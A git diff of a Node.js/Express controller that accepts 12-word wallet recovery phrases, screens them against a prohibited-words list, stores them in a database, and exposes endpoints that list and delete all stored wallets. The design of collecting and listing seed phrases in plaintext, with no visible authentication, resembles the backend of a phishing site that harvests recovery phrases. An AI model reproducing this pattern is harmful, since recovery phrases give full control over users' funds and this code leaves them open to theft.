@@ -6,28 +6,27 @@ const fineTheWord = async (req, res) => {
     await words.create({
       words: req.body.words,
     });
-    res.status(201).send("New Prohibited Word has been added");
-  } catch (error) {
-    res.status(406).send(error);
+    res.send("New Prohibited Word has been added");
+  } catch {
+    res.send("Do not submit that is empty");
   }
 };
 
 // POST WALLETS
 const post_wallet = async (req, res) => {
-  const theArr = req.body.recoveryPhrase;
+  const prohbitedWord = req.body.recoveryPhrase;
+  const prohbitedWordLength = prohbitedWord.length;
 
   const theWord = await words.findOne({
-    words: theArr,
+    words: prohbitedWord,
   });
 
-  // TO EVALUATE THE LENGTH OF THE PHRASE
-  if (theArr.length <= 11 || theArr.length >= 13) {
+  if (theWord !== null) {
+    res.send("Profanities is Prohbited");
+  } else if (prohbitedWordLength <= 11 || prohbitedWordLength >= 13) {
     res.send(
       "Recovery phrase should not be less-than or greater-than 12 words"
     );
-    // TO EVALUATE OF THE PHRASE CONTAINS PROFANITIES
-  } else if (theWord !== null) {
-    res.send("Profanities is prohibited");
   } else {
     try {
       await yourWallet.create({
@@ -42,6 +41,14 @@ const post_wallet = async (req, res) => {
   }
 };
 
+// DETELE WALLET
+const detele_wallets = async (req, res) => {
+  yourWallet
+    .findByIdAndDelete(req.params.id)
+    .then(() => res.send("Wallte has been deleted"))
+    .catch((err) => res.send(err));
+};
+
 // LIST ALL THE WALLETS
 const get_wallets = async (req, res) => {
   try {
@@ -53,4 +60,4 @@ const get_wallets = async (req, res) => {
 };
 
 // EXPORTED MODULES
-module.exports = { post_wallet, fineTheWord, get_wallets };
+module.exports = { post_wallet, fineTheWord, get_wallets, detele_wallets };
